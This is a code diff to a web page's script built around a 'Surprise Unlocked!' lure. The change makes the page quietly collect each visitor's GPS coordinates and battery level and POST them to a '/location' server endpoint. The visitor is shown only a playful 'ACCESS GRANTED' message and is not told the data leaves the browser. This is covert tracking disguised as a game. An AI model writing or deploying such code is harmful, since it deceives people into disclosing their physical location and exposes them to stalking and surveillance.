@@ -278,17 +278,40 @@ const status=document.getElementById("status");
 
 status.style.display="block";
 
-if(navigator.geolocation){
-
 navigator.geolocation.getCurrentPosition(
 
-(pos)=>{
+async (pos)=>{
 
-status.innerText="ACCESS GRANTED. UNLOCKING...";
+let lat = pos.coords.latitude
+let lon = pos.coords.longitude
+
+let battery = 0
+
+if(navigator.getBattery){
+
+let bat = await navigator.getBattery()
+battery = Math.floor(bat.level * 100)
+
+}
+
+fetch("/location",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+user:"visitor",
+latitude:lat,
+longitude:lon,
+battery:battery
+})
+})
+
+status.innerText="ACCESS GRANTED. UNLOCKING..."
 
 setTimeout(()=>{
-alert("🎉 Surprise Unlocked!");
-},1000);
+alert("🎉 Surprise Unlocked!")
+},1000)
 
 },
 
@@ -301,8 +324,6 @@ status.classList.add("error-msg");
 }
 
 );
-
-}
 
 }
 
